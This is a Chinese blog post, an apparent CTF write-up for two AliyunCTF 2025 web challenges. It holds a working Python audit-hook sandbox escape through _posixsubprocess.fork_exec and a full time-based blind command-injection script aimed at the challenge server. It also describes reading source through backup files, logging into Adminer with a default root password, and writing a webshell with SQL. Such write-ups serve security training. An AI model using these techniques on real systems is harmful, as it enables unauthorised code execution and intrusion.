@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>AliyunCTF 2025 部分wp - Gaorenyusi&#39;s Blog</title><meta name="Description" content="白茶清欢无别事，我在等风也等你"><meta property="og:url" content="http://localhost:1313/posts/aliyunctf/">
+  <meta property="og:site_name" content="Gaorenyusi&#39;s Blog">
+  <meta property="og:title" content="AliyunCTF 2025 部分wp">
+  <meta property="og:description" content="白茶清欢无别事，我在等风也等你">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-02-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-25T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="og:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp">
+  <meta name="twitter:title" content="AliyunCTF 2025 部分wp">
+  <meta name="twitter:description" content="白茶清欢无别事，我在等风也等你">
+<meta name="application-name" content="gaorenyusi">
+<meta name="apple-mobile-web-app-title" content="gaorenyusi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/logo.webp"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/aliyunctf/" /><link rel="prev" href="http://localhost:1313/posts/log4j2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "AliyunCTF 2025 部分wp",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/aliyunctf\/"
+        },"image": ["https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"],"genre": "posts","keywords": "CTF","wordcount":  621 ,
+        "url": "http:\/\/localhost:1313\/posts\/aliyunctf\/","datePublished": "2025-02-25T00:00:00+00:00","dateModified": "2025-02-25T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "gaorenyusi","logo": "https:\/\/gaorenyusi.oss-cn-chengdu.aliyuncs.com\/img\/logo.webp"},"author": {
+                "@type": "Person",
+                "name": "gaorenyusi"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> 主页 </a><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/links/" title="友链"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Gaorenyusi&#39;s Blog">Gaorenyusi&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/" title="">主页</a><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/links/" title="友链">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">AliyunCTF 2025 部分wp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>gaorenyusi</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-02-25">2025-02-25</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 621 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#ezoj">ezoj</a></li>
+    <li><a href="#打卡ok">打卡OK</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="ezoj">ezoj</h2>
+<p>访问 <code>/source</code> 读取源码，大概就是会把 python 代码写到一个新的 py 文件然后进行执行，有个 hook 函数</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">collections</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">queue</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">heapq</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bisect</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">audit_checker</span><span class="p">(</span><span class="n">event</span><span class="p">,</span><span class="n">args</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">event</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;import&#34;</span><span class="p">,</span><span class="s2">&#34;time.sleep&#34;</span><span class="p">,</span><span class="s2">&#34;builtins.input&#34;</span><span class="p">,</span><span class="s2">&#34;builtins.input/result&#34;</span><span class="p">]:</span>        
+</span></span><span class="line"><span class="cl">    	<span class="k">raise</span> <span class="ne">RuntimeError</span>  
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">audit_checker</span><span class="p">)</span></span></span></code></pre></div></div><p>绕过 <code>addaudithook</code> 可以参考这篇文章：
+<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html" target="_blank" rel="noopener noreffer ">https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html</a></p>
+<p>最后构造下面命令进行命令执行，</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">_posixsubprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">,</span><span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;ls /&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span><span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span></span></span></code></pre></div></div><p>但是没有执行结果回显，因为给了 <code>time.sleep</code> 可以使用，本来想直接在这个 py 沙箱进行时间盲注的但是无法把结果赋值变量，所以重新写个文件 <code>/tmp/1.py</code> ，再在这个 py 文件进行盲注，构造脚本：</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>  
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">strings</span> <span class="o">=</span> <span class="s2">&#34;qwertyuiopasdfghjklzxcvbnm1234567890</span><span class="si">{}</span><span class="s2">-&#34;</span>  
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;  
+</span></span></span><span class="line"><span class="cl"><span class="s2">import _posixsubprocess  
+</span></span></span><span class="line"><span class="cl"><span class="s2">import os  
+</span></span></span><span class="line"><span class="cl"><span class="s2">_posixsubprocess.fork_exec([b&#34;/bin/sh&#34;,&#34;-c&#34;, &#34;python3 /tmp/1.py&#34;], [b&#34;/bin/sh&#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)  
+</span></span></span><span class="line"><span class="cl"><span class="s2">  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">50</span><span class="p">):</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">strings</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">poc1</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;&#34;&#34;import time  
+</span></span></span><span class="line"><span class="cl"><span class="s2">import os  
+</span></span></span><span class="line"><span class="cl"><span class="s2">if os.popen(&#39;whoami&#39;).read(</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">)[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">-1] == &#34;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#34;:  
+</span></span></span><span class="line"><span class="cl"><span class="s2">    time.sleep(2)else:  
+</span></span></span><span class="line"><span class="cl"><span class="s2">    print(&#34;&#34;)    &#34;&#34;&#34;</span>        
+</span></span><span class="line"><span class="cl">        <span class="n">poc2</span><span class="o">=</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">poc1</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">payload2</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;  
+</span></span></span><span class="line"><span class="cl"><span class="s2">import _posixsubprocess  
+</span></span></span><span class="line"><span class="cl"><span class="s2">import os  
+</span></span></span><span class="line"><span class="cl"><span class="s2">_posixsubprocess.fork_exec([b&#34;/bin/sh&#34;,&#34;-c&#34;, &#34;echo &#39;</span><span class="si">{</span><span class="n">poc2</span><span class="si">}</span><span class="s2">&#39;|base64 -d&gt;/tmp/1.py&#34;], [b&#34;/bin/sh&#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)  
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="n">resp1</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">                <span class="s2">&#34;http://172.29.230.100:8089/api/submit&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;code&#34;</span><span class="p">:</span> <span class="n">payload2</span><span class="p">},</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">start_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">resp2</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>  
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;http://172.29.230.100:8089/api/submit&#34;</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;problem_id&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;code&#34;</span><span class="p">:</span> <span class="n">payload1</span><span class="p">},</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="n">end_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>  <span class="c1"># 记录请求结束时间  </span>
+</span></span><span class="line"><span class="cl">        <span class="n">delay</span> <span class="o">=</span> <span class="n">end_time</span> <span class="o">-</span> <span class="n">start_time</span>  <span class="c1"># 计算延迟时间  </span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">delay</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">flag</span> <span class="o">+=</span> <span class="n">j</span>  
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">flag</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">break</span></span></span></code></pre></div></div><p>本地效果，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250222195930200.webp" /></p>
+<p>最后盲注获得 flag。</p>
+<h2 id="打卡ok">打卡OK</h2>
+<p>开题就一个登录界面，不知道 code 是什么感觉爆破也是白爆破，进行目录扫描</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163148106.webp" /></p>
+<p>访问 <code>/index.php~</code> 发现可以查看 <code>index.php</code> 源码，尝试其他 php 文件名后加个~都可以读取源码，在 <code>login.php</code> 源码得到个数据库账户密码，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163435215.webp" /></p>
+<p>然后再在 <code>ok.php</code> 源码发现存在 <code>adminer_481.php</code> 路径</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223163514516.webp" /></p>
+<p>访问路径是个数据库管理服务，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223164006323.webp" /></p>
+<p>连接后可以添加账户进行登录，但是登录后审半天也不知道想考个什么。</p>
+<p>然后看到还能执行 sql 语句，尝试 sql 写马，但是在写马时报错了，显示权限不足，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165217652.webp" /></p>
+<p>最后发现还可以 root 账户进行登录，默认密码就为 root，</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165433901.webp" /></p>
+<p>成功后访问<code>/shell.php</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp"
+        data-srcset="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp 1.5x, https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp 2x"
+        data-sizes="auto"
+        alt="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp"
+        title="https://gaorenyusi.oss-cn-chengdu.aliyuncs.com/img/file-20250223165555236.webp" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2025-02-25</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/aliyunctf/" data-title="AliyunCTF 2025 部分wp" data-hashtags="CTF"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/aliyunctf/" data-hashtag="CTF"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">CTF</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/log4j2/" class="prev" rel="prev" title="Log4j2 漏洞复现"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Log4j2 漏洞复现</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">gaorenyusi</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lunr/lunr.stemmer.support.min.js"></script><script src="/lib/lunr/lunr.zh.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+</html>
